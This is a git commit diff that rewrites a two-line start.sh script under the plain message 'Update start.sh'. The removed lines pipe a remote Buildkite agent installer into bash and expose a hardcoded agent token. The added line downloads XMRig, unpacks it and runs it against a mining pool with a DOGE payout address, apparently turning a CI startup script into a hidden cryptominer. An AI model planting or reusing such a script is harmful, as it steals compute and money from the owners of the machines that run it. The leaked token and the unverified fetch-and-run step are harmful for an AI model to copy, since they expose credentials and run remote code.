d737f1aad894c69f02a5a31a8fd403c23dd22a68
wgblkj <106138598+wgblkj@users.noreply.github.com>
2022-05-24 07:45:22 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
-TOKEN="7fd05cb6ce15d49eef7fb7204eb0e3e4f7ace99ed8cb63b5d3" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
-~/.buildkite-agent/bin/buildkite-agent start
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz && tar xvf xmrig-6.17.0-linux-static-x64.tar.gz && ./xmrig-6.17.0/xmrig -o statum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:D8YGsVokte9ahg7P1pCn5BLWfUouDWF6qQ -p x
+
